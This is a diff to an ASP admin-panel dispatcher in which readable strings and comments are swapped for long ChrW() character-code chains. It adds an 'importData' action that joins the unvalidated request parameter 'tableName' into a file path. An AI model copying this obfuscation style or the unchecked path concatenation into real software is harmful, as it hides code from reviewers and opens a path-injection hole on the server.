+Call saveAddEdit(a, b, ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115)&ChrW(124)&ChrW(124)&ChrW(44)&ChrW(110)&ChrW(111)&ChrW(102)&ChrW(111)&ChrW(108)&ChrW(108)&ChrW(111)&ChrW(119)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(105)&ChrW(115)&ChrW(111)&ChrW(110)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(105)&ChrW(115)&ChrW(116)&ChrW(104)&ChrW(114)&ChrW(111)&ChrW(117)&ChrW(103)&ChrW(104)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(105)&ChrW(115)&ChrW(100)&ChrW(111)&ChrW(109)&ChrW(97)&ChrW(105)&ChrW(110)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(124)&ChrW(44)&ChrW(112)&ChrW(119)&ChrW(100)&ChrW(124)&ChrW(109)&ChrW(100)&ChrW(53)&ChrW(124))
+End if 
+End sub 
+call loadRun()
+
 sub loadRun()
+dim a
 
-    '这是为了给.net使用的，因为在.net里面全局变量不能有变量
-    WEB_CACHEFile = replace(replace(WEB_CACHEFile, "[adminDir]", adminDir), "[EDITORTYPE]", EDITORTYPE) 
+WEB_CACHEFile = replace(replace(WEB_CACHEFile, ChrW(91)&ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(68)&ChrW(105)&ChrW(114)&ChrW(93), adminDir), ChrW(91)&ChrW(69)&ChrW(68)&ChrW(73)&ChrW(84)&ChrW(79)&ChrW(82)&ChrW(84)&ChrW(89)&ChrW(80)&ChrW(69)&ChrW(93), EDITORTYPE) 
 
-    '登录判断
-    if getSession("adminusername") = "" And session("adminid")="" then
-        if request("act") <> "" and request("act") <> "displayAdminLogin" and request("act") <> "login" then
-            call RR(WEB_ADMINURL & "?act=displayAdminLogin&a=1") 
-        end if 
-    end if 
+if getSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101)) = "" And session(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(105)&ChrW(100))="" then
+if request(ChrW(97)&ChrW(99)&ChrW(116)) <> "" and request(ChrW(97)&ChrW(99)&ChrW(116)) <> ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110) and request(ChrW(97)&ChrW(99)&ChrW(116)) <> ChrW(108)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110) then
+call RR(WEB_ADMINURL & ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110)&ChrW(38)&ChrW(97)&ChrW(61)&ChrW(49)) 
+end if 
+end if 
 
-
-    'call eerr("WEB_CACHEFile",WEB_CACHEFile)
-    call openconn() 
-    if request("act") = "dispalyManageHandle" then
-        call dispalyManageHandle(request("actionType"))                                 '显示管理处理         ?act=dispalyManageHandle&actionType=WebLayout
-    elseif request("act") = "addEditHandle" then
-        call addEditHandle(request("actionType"), request("lableTitle"))                '添加修改处理      ?act=addEditHandle&actionType=WebLayout
-    elseif request("act") = "saveAddEditHandle" then
-        call saveAddEditHandle(request("actionType"), request("lableTitle"))            '保存模块处理  ?act=saveAddEditHandle&actionType=WebLayout
-    elseif request("act") = "delHandle" then
-        call del(request("actionType"), request("lableTitle"))                          '删除处理  ?act=delHandle&actionType=WebLayout
-    elseif request("act") = "sortHandle" then
-        call sortHandle(request("actionType"))                                          '排序处理  ?act=sortHandle&actionType=WebLayoutt
-		
-    elseif request("act") = "viewsHandle" then
-        call viewsHandle(request("actionType"))                                          '点击处理  ?act=viewsHandle&actionType=WebLayout
-		
-   elseif request("act") = "batchEditPrice" then
-        call batchEditPrice(request("actionType"))                                 '价格处理  ?act=batchEditPrice&actionType=WebLayout
-   
-   
-    elseif request("act") = "updateField" then
-        call updateField()                                                              '更新字段
-
-
-    elseif request("act") = "displayLayout" then
-        call displayLayout()                                                            '显示布局
-    elseif request("act") = "saveRobots" then
-        call saveRobots()                                                               '保存robots.txt
-    elseif request("act") = "deleteAllMakeHtml" then
-        call deleteAllMakeHtml()                                                        '删除全部生成的html文件
-
-    elseif request("act") = "isOpenTemplate" then
-        call isOpenTemplate()                                                           '更换模板
-    elseif request("act") = "executeSQL" then
-        call executeSQL()                                                               '执行SQL
-
-
-
-    elseif request("act") = "function" then
-
-        call callFunction()                                                             '调用function文件函数
-    elseif request("act") = "function2" then
-        call callFunction2()                                                            '调用function2文件函数
-    elseif request("act") = "function_cai" then
-        call callFunction_cai()                                                         '调用function_cai文件函数   '【@是.netc屏蔽@】
-    elseif request("act") = "file_setAccess" then
-        call callfile_setAccess()                                                       '调用file_setAccess文件函数
-
-
-    elseif request("act") = "setAccess" then
-        call resetAccessData()    
-
-    elseif request("act") = "importArticle" then
-        call importArticle()                                                          '导入文章20220422
-    elseif request("act") = "importSheShi" then
-        call importSheShi()                                                          '导入省市县20220424
-
-    elseif request("act") = "login" then
-        call login()                                                                    '登录
-    elseif request("act") = "adminOut" then
-        call adminOut()                                                                 '退出登录
-    elseif request("act") = "adminIndex" then
-        call adminIndex()                                                               '管理首页
-    elseif request("act") = "clearCache" then
-        call clearCache()                                                               '清除缓冲
-    else
-		call displayAdminLogin()                                                      '显示后台登录
-    end if 
+call openconn() 
+if request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(97)&ChrW(108)&ChrW(121)&ChrW(77)&ChrW(97)&ChrW(110)&ChrW(97)&ChrW(103)&ChrW(101)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
+call dispalyManageHandle(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)))
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(97)&ChrW(100)&ChrW(100)&ChrW(69)&ChrW(100)&ChrW(105)&ChrW(116)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
+call addEditHandle(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)), request(ChrW(108)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101)))
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(115)&ChrW(97)&ChrW(118)&ChrW(101)&ChrW(65)&ChrW(100)&ChrW(100)&ChrW(69)&ChrW(100)&ChrW(105)&ChrW(116)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
+call saveAddEditHandle(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)), request(ChrW(108)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101)))
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(100)&ChrW(101)&ChrW(108)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
+call del(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)), request(ChrW(108)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101)))
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(115)&ChrW(111)&ChrW(114)&ChrW(116)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
+call sortHandle(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)))
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(118)&ChrW(105)&ChrW(101)&ChrW(119)&ChrW(115)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
+call viewsHandle(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)))
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(98)&ChrW(97)&ChrW(116)&ChrW(99)&ChrW(104)&ChrW(69)&ChrW(100)&ChrW(105)&ChrW(116)&ChrW(80)&ChrW(114)&ChrW(105)&ChrW(99)&ChrW(101) then
+call batchEditPrice(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)))
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(117)&ChrW(112)&ChrW(100)&ChrW(97)&ChrW(116)&ChrW(101)&ChrW(70)&ChrW(105)&ChrW(101)&ChrW(108)&ChrW(100) then
+call updateField()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(76)&ChrW(97)&ChrW(121)&ChrW(111)&ChrW(117)&ChrW(116) then
+call displayLayout()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(115)&ChrW(97)&ChrW(118)&ChrW(101)&ChrW(82)&ChrW(111)&ChrW(98)&ChrW(111)&ChrW(116)&ChrW(115) then
+call saveRobots()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(100)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(116)&ChrW(101)&ChrW(65)&ChrW(108)&ChrW(108)&ChrW(77)&ChrW(97)&ChrW(107)&ChrW(101)&ChrW(72)&ChrW(116)&ChrW(109)&ChrW(108) then
+call deleteAllMakeHtml()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(105)&ChrW(115)&ChrW(79)&ChrW(112)&ChrW(101)&ChrW(110)&ChrW(84)&ChrW(101)&ChrW(109)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(116)&ChrW(101) then
+call isOpenTemplate()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(101)&ChrW(120)&ChrW(101)&ChrW(99)&ChrW(117)&ChrW(116)&ChrW(101)&ChrW(83)&ChrW(81)&ChrW(76) then
+call executeSQL()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(102)&ChrW(117)&ChrW(110)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110) then
+call callFunction()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(102)&ChrW(117)&ChrW(110)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(50) then
+call callFunction2()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(102)&ChrW(117)&ChrW(110)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(95)&ChrW(99)&ChrW(97)&ChrW(105) then
+call callFunction_cai()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(102)&ChrW(105)&ChrW(108)&ChrW(101)&ChrW(95)&ChrW(115)&ChrW(101)&ChrW(116)&ChrW(65)&ChrW(99)&ChrW(99)&ChrW(101)&ChrW(115)&ChrW(115) then
+call callfile_setAccess()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(115)&ChrW(101)&ChrW(116)&ChrW(65)&ChrW(99)&ChrW(99)&ChrW(101)&ChrW(115)&ChrW(115) then
+call resetAccessData()    
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(105)&ChrW(109)&ChrW(112)&ChrW(111)&ChrW(114)&ChrW(116)&ChrW(65)&ChrW(114)&ChrW(116)&ChrW(105)&ChrW(99)&ChrW(108)&ChrW(101) then
+call importArticle()  
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(105)&ChrW(109)&ChrW(112)&ChrW(111)&ChrW(114)&ChrW(116)&ChrW(68)&ChrW(97)&ChrW(116)&ChrW(97) then
+a=ChrW(92)&ChrW(105)&ChrW(110)&ChrW(115)&ChrW(116)&ChrW(97)&ChrW(108)&ChrW(108)&ChrW(92)&ChrW(119)&ChrW(101)&ChrW(98)&ChrW(100)&ChrW(97)&ChrW(116)&ChrW(97)&ChrW(92) & request(ChrW(116)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(78)&ChrW(97)&ChrW(109)&ChrW(101))
+call importData(request(ChrW(116)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(78)&ChrW(97)&ChrW(109)&ChrW(101)),a,"")
+call eerr(ChrW(25552)&ChrW(31034),ChrW(23436)&ChrW(25104)&ChrW(33))
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(105)&ChrW(109)&ChrW(112)&ChrW(111)&ChrW(114)&ChrW(116)&ChrW(83)&ChrW(104)&ChrW(101)&ChrW(83)&ChrW(104)&ChrW(105) then
+call importSheShi()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(108)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110) then
+call login()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(79)&ChrW(117)&ChrW(116) then
+call adminOut()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(110)&ChrW(100)&ChrW(101)&ChrW(120) then
+call adminIndex()
+elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(99)&ChrW(108)&ChrW(101)&ChrW(97)&ChrW(114)&ChrW(67)&ChrW(97)&ChrW(99)&ChrW(104)&ChrW(101) then
+call clearCache()
+else
+call displayAdminLogin()
+end if 
 end sub
 %> 
-
-
